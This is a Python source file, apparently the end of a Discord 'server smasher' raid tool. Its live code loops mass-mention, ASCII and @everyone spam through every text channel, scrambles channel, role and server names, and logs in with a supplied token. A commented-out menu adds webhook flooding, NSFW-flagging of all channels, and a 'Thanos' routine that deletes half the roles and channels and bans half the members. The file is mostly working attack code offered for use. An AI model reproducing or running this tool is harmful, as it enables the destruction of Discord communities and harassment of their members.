    #                     print("Manage Nicknames")
    #                 if myperms.move_members:
    #                     print("Move Members")
    #                 break
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
    #             await main(SERVER)
    #         elif int(sel) == 5:
    #
    #             print("Webhook Smasher")
    #             print(colored("Please Enter the text to spam,\nFor random ascii type 'asc' or to go back type 'back' or 'b'\nThis will trigger the rate limit for webhooks instantly.",menucolour))
    #             txtspam = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #             if txtspam.lower() == "back":
    #                 await main(SERVER)
    #             if txtspam.lower() == "b":
    #                 await main(SERVER)
    #             channellist = []
    #
    #             print("Please Wait...")
    #             for channel in server.text_channels:
    #                 for webhook in await channel.webhooks():
    #                     await webhook.delete()
    #                 channellist.append(channel)
    #             if sys.platform.startswith('win32'):
    #                 if len(channellist) > 40:
    #                     screensize = 7
    #                     screensize += len(channellist)
    #                     os.system('mode con:cols=70 lines={}'.format(str(screensize)))
    #             elif sys.platform.startswith('linux'):
    #                 if len(channellist) > 40:
    #                     screensize = 7
    #                     screensize += len(channellist)
    #                     os.system("printf '\033[8;{};70t'".format(str(screensize)))
    #             chancounter = -1
    #
    #             print("Select Channel To spam.")
    #             for channel in channellist:
    #                 chancounter += 1
    #                 print("{}. {}".format(chancounter,channel))
    #             channelchoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Channel of Choice: ')
    #             try:
    #                 chan = channellist[int(channelchoice)]
    #             except Exception:
    #                 await main(SERVER)
    #             webhooks = []
    #             for x in range(10):
    #                 wh = await chan.create_webhook(name=asciigen(random.randint(2,80)))
    #                 webhooks.append('https://discordapp.com/api/webhooks/{}/{}'.format(wh.id,wh.token))
    #             for webhook in webhooks:
    #                 pool.add_task(webhook_spam,webhook,txtspam)
    #             await main(SERVER)
    #         elif int(sel) == 6:
    #
    #             print ("Are you sure you want to corrupt this server?")
    #             y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Y/N: ')
    #             if y.lower() == 'y':
    #                 await corruptor(server)
    #             else:
    #                 await main(SERVER)
    #         elif int(sel) == 7:
    #             await music_player_channel_select(server)
    #         elif int(sel) == 8:
    #             y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue\nY/N: ')
    #             if y.lower() == 'y':
    #                 for channel in server.channels:
    #                     pool.add_task(nsfwchannel,channel.id)
    #                 await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #                 await main(SERVER)
    #             else:
    #                 await main(SERVER)
    #         elif int(sel) == 9:
    #             print(colored("0. Back\nEnter New Name"))
    #             y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #             if y == "0":
    #                 await main(SERVER)
    #             for channel in server.channels:
    #                 pool.add_task(topicedit,channel.id,y)
    #             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #             await main(SERVER)
    #         elif int(sel) == 10:
    #
    #             print(colored("The end is near.",'magenta'))
    #             s = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue?(Y/N): ')
    #             if s.lower() == 'y':
    #                 pass
    #             else:
    #                 await main(SERVER)
    #             channels = []
    #             users = []
    #             roles = []
    #             for channel in server.channels:
    #                 try:
    #                     wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
    #                 except Exception as e:
    #                     print(e)
    #                     continue
    #                 else:
    #                     break
    #             beginquotes = ['When I’m done, half of humanity will still exist. Perfectly balanced, as all things should be. I hope they remember you.','You’re strong. But I could snap my fingers, and you’d all cease to exist.','You should have gone for the head.','Dread it. Run from it. Destiny still arrives. Or should I say, I have.','I ignored my destiny once, I can not do that again. Even for you. I’m sorry Little one.','With all six stones, I can simply snap my fingers, they would all cease to exist. I call that mercy.','The hardest choices require the strongest wills.']
    #             try:
    #                 hook = Webhook(wh.url)
    #                 hook.send("**{}**".format(random.choice(beginquotes)),avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
    #             except Exception:
    #                 pass
    #             await asyncio.sleep(5)
    #             for channel in server.channels:
    #                 channels.append(channel)
    #             for role in server.roles:
    #                 roles.append(role)
    #             for user in server.members:
    #                 users.append(user)
    #             count = 0
    #             halfroles = int(round(len(server.roles) / 2))
    #             for role in roles:
    #                 count += 1
    #                 if halfroles == count:
    #                     break
    #                 pool.add_task(deleterole,str(role.id),SERVER)
    #                 roles.remove(role)
    #             count = 0
    #             halfchan = int(round(len(server.channels) / 2))
    #             for channel in channels:
    #                 count += 1
    #                 if halfchan == count:
    #                     break
    #                 pool.add_task(deletechannel,str(channel.id))
    #                 channels.remove(channel)
    #             count = 0
    #             halfuser = int(round(len(server.members) / 2))
    #             for user in users:
    #                 count += 1
    #                 if halfuser == count:
    #                     break
    #                 pool.add_task(banuser,str(user.id),SERVER)
    #                 users.remove(user)
    #             pool.wait_completion()
    #             await asyncio.sleep(10)
    #             for channel in channels:
    #                 try:
    #                     wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
    #                 except Exception as e:
    #                     print(e)
    #                     continue
    #                 else:
    #                     break
    #             endquotes = ['Perfectly balanced, as all things should be.','Fun isn’t something one considers when balancing the universe. But this… does put a smile on my face.']
    #             try:
    #                 hook = Webhook(wh.url)
    #                 hook.send("**{}**".format(random.choice(endquotes)),avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
    #             except Exception:
    #                 pass
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Perfectly balanced, as all things should be.')
    #             await main(SERVER)
    #         else:
    #             await main(SERVER)
    #
    #     elif int(opts) == 3:
    #         for channel in server.text_channels:
    #             invitelink = await channel.create_invite()
    #             invite = invitelink.url
    #             try:
    #                 pyperclip.copy(invite)
    #             except Exception:
    #                 print (invite)
    #             else:
    #                 print (invite + " copied to clipboard.")
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #             await main(SERVER)
    #         for channel in server.voice_channels:
    #             invitelink = await channel.create_invite()
    #             invite = invitelink.url
    #             try:
    #                 pyperclip.copy(invite)
    #             except Exception:
    #                 print (invite)
    #             else:
    #                 print (invite + " copied to clipboard.")
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #             await main(SERVER)
    #         print ("Unable to create invite.")
    #         await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #         await main(SERVER)
    #
    #     elif int(opts) == 4:
    #         play = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Playing ')
    #         await client.change_presence(activity=discord.Game(name=play))
    #         await main(SERVER)
    #
    #     elif int(opts) == 5:
    #         print ("Are you sure you want to leave this server? (Y/N): ")
    #         yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #         if yn.lower() == 'y':
    #             await server.leave()
    #             await asyncio.sleep(3)
    #             await serverselect()
    #         else:
    #             await main(SERVER)
    #
    #     elif int(opts) == 6:
    #         await serverselect()
    # except Exception as e:
    #     print (colored("Error:","red"))
    #     print (colored(e,"red"))
    #     await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #     await main(SERVER)

async def mass_tag(SERVER,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    msg = ''
    for member in server.members:
        msg += member.mention + ' '
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+channel.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                pool.add_task(sendspam,str(channel.id),m,usetts)

async def ascii_spam(SERVER,usetts): # "oh god you scrambled that server"
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),asciigen(1999),usetts)

async def text_spam(SERVER,customtxt,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Text Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),customtxt,usetts)

async def everyonespam(SERVER,usetts):
    await asyncio.sleep(5)
    server = client.get_guild(int(SERVER))
    await client.wait_until_ready()
    while not client.is_closed():
        for channel in server.text_channels:
            myperms = channel.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            message = "@everyone"
            print('@everyone Spamming in: '+channel.name)
            pool.add_task(sendspam,str(channel.id),message,usetts)

async def corruptor(server):
    SERVER = server.id
    print("Corrupting...")
    for channel in server.channels:
        pool.add_task(corrupt_channel,channel.id,channel.name)
    for role in server.roles:
        pool.add_task(corrupt_role,server.id,role.id,role.name)
    servername = ''
    for x in server.name:
        if random.randint(1,2) == 1:
            servername += asciigen(1)
        else:
            servername += x
    await server.edit(name=servername)
    pool.wait_completion()
    print("Corrupted the server.")
    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press enter to return to menu.')
    await main(SERVER)

def start_client():
    global client_type
    global token
    global user
    global user_cache
    global avatar_b64
    try:
        user_cache = get_user_info()
        if user_cache.avatar is None:
            avatar_b64 = b'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'
        else:
            src = requests.get(construct_avatar_link(user_cache.id, user_cache.avatar, 64)).content
            avatar_b64 = base64.b64encode(src)
    except Exception:
        sg.Popup("Error Logging into token.", title="Error")
        login_serversmasher()
    main_menu()

login_serversmasher()
